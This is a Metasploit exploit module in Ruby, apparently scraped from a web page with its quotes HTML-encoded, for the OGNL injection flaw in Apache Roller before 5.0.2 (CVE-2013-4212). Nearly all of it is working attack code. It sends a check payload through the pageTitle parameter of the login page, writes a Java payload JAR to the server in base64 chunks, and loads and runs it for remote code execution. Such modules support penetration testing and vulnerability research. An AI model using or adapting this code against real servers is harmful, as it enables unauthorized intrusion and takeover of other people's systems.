# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Roller OGNL Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an OGNL injection vulnerability in Apache Roller < 5.0.2. The
        vulnerability is due to an OGNL injection on the UIAction controller because of an
        insecure usage of the ActionSupport.getText method. This module has been tested
        successfully on Apache Roller 5.0.1 on Ubuntu 10.04.
      },
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # From coverity.com / Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-4212&#039;],
          [ &#039;URL&#039;, &#039;http://security.coverity.com/advisory/2013/Oct/remote-code-execution-in-apache-roller-via-ognl-injection.html&#039;]
        ],
      &#039;Platform&#039;      => &#039;java&#039;,
      &#039;Arch&#039;          => ARCH_JAVA,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [ &#039;Apache Roller 5.0.1&#039;, { } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 31 2013&#039;,
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to the Apache Roller application.&#039;, "/roller"])
        ], self.class)
  end

  def execute_command(cmd)
    injection = "%24{(%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue,CMD,&#039;&#039;)}"
    injection.gsub!(/CMD/, Rex::Text::uri_encode(cmd))

    vprint_status("Attempting to execute: #{cmd}")

    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path.to_s, "roller-ui", "login.rol"),
      &#039;encode_params&#039; => false,
      &#039;vars_get&#039; =>
      {
        &#039;pageTitle&#039; => injection
      }
    })
  end

  def java_upload_part(part, filename, append = &#039;false&#039;)
    cmd = "#f=new java.io.FileOutputStream(&#039;#{filename}&#039;+#a,#{append}),"
    cmd << "#f.write(new sun.misc.BASE64Decoder().decodeBuffer(&#039;#{Rex::Text.encode_base64(part)}&#039;)),"
    cmd << "#f.close(),#a=&#039;#{@random_suffix}&#039;"
    execute_command(cmd)
  end

  def exploit

    print_status("Checking injection...")

    if check == Exploit::CheckCode::Vulnerable
      print_good("Target looks vulnerable, exploiting...")
    else
      print_warning("Target not found as vulnerable, trying anyway...")
    end

    @random_suffix = rand_text_alphanumeric(3) # To avoid duplicate execution
    @payload_exe = rand_text_alphanumeric(4+rand(4)) + ".jar"
    append = &#039;false&#039;
    jar = payload.encoded_jar.pack

    File.open("/tmp/#{@payload_exe}", "wb") do |f| f.write(jar) end

    chunk_length = 384 # 512 bytes when base64 encoded

    parts = jar.chars.each_slice(chunk_length).map(&:join)
    parts.each do |part|
      java_upload_part(part, @payload_exe, append)
      append = &#039;true&#039;
    end

    register_files_for_cleanup("#{@payload_exe}null", "#{@payload_exe}#{@random_suffix}")

    cmd = ""
    # disable Vararg handling (since it is buggy in OGNL used by Struts 2.1
    cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdkChecked&#039;),"
    cmd << "#q.setAccessible(true),#q.set(null,true),"
    cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdk15&#039;),"
    cmd << "#q.setAccessible(true),#q.set(null,false),"
    # create classloader
    cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(&#039;#{@payload_exe}&#039;+#a).toURI().toURL()}),#a=&#039;#{rand_text_alphanumeric(4)}&#039;,"
    # load class
    cmd << "#c=#cl.loadClass(&#039;metasploit.Payload&#039;),"
    # invoke main method
    cmd << "#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)}).invoke("
    cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
    execute_command(cmd)
  end

  def check
    addend_one = rand_text_numeric(rand(3) + 1).to_i
    addend_two = rand_text_numeric(rand(3) + 1).to_i
    sum = addend_one + addend_two

    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path.to_s, "roller-ui", "login.rol"),
      &#039;vars_get&#039; =>
        {
          &#039;pageTitle&#039; => "${new java.lang.Integer(#{addend_one}+#{addend_two})}",
        }
    })

    if res and res.code == 200 and res.body =~ /#{sum}/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

end

